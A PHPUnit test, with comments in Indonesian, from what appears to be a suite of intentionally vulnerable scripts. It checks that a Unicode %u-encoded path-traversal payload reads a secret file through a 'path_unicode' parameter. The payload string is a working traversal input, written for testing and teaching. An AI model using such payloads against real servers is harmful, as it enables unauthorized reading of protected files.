<?php // tests/UnicodeTraversalTest.php

namespace Tests;

class UnicodeTraversalTest extends BaseVulnerableScriptTest
{
    public function testCanAccessSecretFileWithUnicodePercentUTraversal()
    {
        $scriptName = 'vuln_unicode_traversal.php';
        // %u002e%u002e%u2216 adalah ../ (menggunakan %u2216 sebagai alternatif /)
        // Payload untuk '../secret_files/secret.txt'
        $payload = '%u002e%u002e%u2216secret_files%u2216secret.txt';
        $params = ['path_unicode' => $payload];

        $output = $this->executeScript($scriptName, $params);

        $this->assertStringContainsString($this->secretContent, $output, "Gagal mengambil konten rahasia menggunakan Unicode %u traversal.");
        $this->assertStringContainsString("Raw Unicode input: " . $payload, $output);

        // Path yang di-decode oleh custom_unicode_decoder adalah '../secret_files/secret.txt'
        // dimana \u2216 menjadi karakter division slash.
        // Kita perlu menormalisasi slash untuk perbandingan yang konsisten.
        $decodedForAssertion = '../secret_files/secret.txt';
        $outputForAssertion = str_replace("\u{2216}", "/", $output); // Ganti division slash dengan forward slash biasa di output

        $this->assertStringContainsString("Decoded path (after custom_unicode_decoder): " . $decodedForAssertion, $outputForAssertion);
    }
}